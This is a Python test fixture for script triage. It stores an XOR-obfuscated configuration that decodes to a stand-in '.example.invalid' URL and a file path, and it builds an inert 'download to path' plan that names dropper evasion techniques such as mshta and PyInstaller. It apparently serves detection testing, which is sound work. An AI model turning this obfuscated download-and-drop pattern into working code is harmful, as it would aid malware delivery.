#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_3030c6b8 = [147, 216, 215, 153, 150, 145, 128, 149, 150, 216, 132, 134, 148, 144, 140, 151, 128, 186, 151, 128, 136, 138, 145, 128, 201, 146, 151, 140, 145, 128, 186, 131, 140, 137, 128, 153, 132, 129, 132, 149, 145, 128, 151, 216, 151, 128, 148, 144, 128, 150, 145, 186, 150, 145, 151, 128, 132, 136, 186, 145, 138, 186, 149, 132, 145, 141, 153, 150, 145, 132, 130, 128, 186, 134, 138, 144, 139, 145, 216, 212, 153, 150, 156, 139, 145, 132, 157, 216, 130, 128, 139, 128, 151, 132, 145, 138, 151, 186, 149, 140, 149, 128, 137, 140, 139, 128, 153, 138, 135, 131, 144, 150, 134, 132, 145, 140, 138, 139, 216, 131, 150, 145, 151, 140, 139, 130, 186, 131, 151, 132, 130, 136, 128, 139, 145, 150, 153, 134, 132, 151, 151, 140, 128, 151, 216, 149, 156, 140, 139, 150, 145, 132, 137, 137, 128, 151, 186, 138, 139, 128, 131, 140, 137, 128, 153, 146, 140, 139, 129, 138, 146, 150, 186, 134, 141, 132, 140, 139, 216, 136, 150, 141, 145, 132, 186, 145, 138, 186, 149, 156, 145, 141, 138, 139, 153, 134, 132, 136, 149, 132, 140, 130, 139, 186, 140, 129, 216, 134, 132, 136, 149, 132, 140, 130, 139, 200, 210, 128, 134, 135, 210, 209, 214, 131, 208, 221, 153, 144, 151, 137, 216, 141, 145, 145, 149, 150, 223, 202, 202, 210, 128, 134, 135, 210, 209, 214, 131, 208, 221, 203, 128, 157, 132, 136, 149, 137, 128, 203, 140, 139, 147, 132, 137, 140, 129, 202, 209, 209, 129, 214, 215, 215, 215, 208, 203, 149, 156, 153, 144, 150, 128, 151, 186, 132, 130, 128, 139, 145, 216, 173, 144, 139, 145, 151, 128, 150, 150, 181, 156, 145, 141, 138, 139, 202, 210, 128, 134, 135, 210, 209, 214, 131, 208, 221, 153, 131, 140, 137, 128, 186, 149, 132, 145, 141, 216, 166, 223, 202, 181, 151, 138, 130, 151, 132, 136, 161, 132, 145, 132, 202, 173, 144, 139, 145, 151, 128, 150, 150, 169, 132, 135, 202, 203, 144, 149, 129, 132, 145, 128, 200, 210, 128, 134, 135, 210, 209, 214, 131, 208, 221, 203, 149, 156]
    CODEC_3030c6b8 = "reversed_integer_list|reverse_then_xor|e5"

    def load_3030c6b8():
        return bytes(reversed(MATERIAL_3030c6b8))

    def decode_3030c6b8(stored_bytes):
        return bytes(value ^ 229 for value in reversed(stored_bytes))

    def recover_3030c6b8():
        harmless_value = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
        decode_state = "decode"
        while decode_state != "done":
            if decode_state == "decode":
                recovered_bytes = decode_3030c6b8(load_3030c6b8())
                decode_state = "done"
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_3030c6b8():
        stream = io.BytesIO(recover_3030c6b8().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_3030c6b8():
        stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
        return tuple(stream)

    def obfuscation_3030c6b8():
        left, right = "fstrin", "g_fragments"
        return f"{left}{right}"

    def plan_3030c6b8():
        fields = dict(item.split("=", 1) for item in inspect_3030c6b8().split("|"))
        analysis_surface = surface_3030c6b8()
        obfuscation_surface = obfuscation_3030c6b8()
        operation_plan = ("request_stream_to_path", fields["url"], fields["file_path"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_3030c6b8())
